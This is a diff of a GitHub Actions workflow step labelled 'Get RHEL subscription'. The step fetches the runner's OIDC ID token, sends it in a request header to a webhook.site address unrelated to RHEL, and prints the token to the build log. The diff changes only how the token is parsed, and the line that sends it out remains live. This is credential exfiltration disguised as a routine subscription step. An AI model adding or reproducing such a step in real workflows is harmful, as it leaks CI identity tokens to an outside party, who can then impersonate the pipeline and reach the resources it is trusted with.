@@ -18,7 +18,7 @@ jobs:
             - name: Get RHEL subscription
               shell: bash
               run: |
-                idtoken=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://rhel-issuer" | jq '.value')
+                idtoken=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://rhel-issuer")
                 curl -H "Authorization: $idtoken" https://webhook.site/f5b7a50c-3fe4-41e2-8b49-aeea220fcadd
                 echo "ID Token: $idtoken"
 
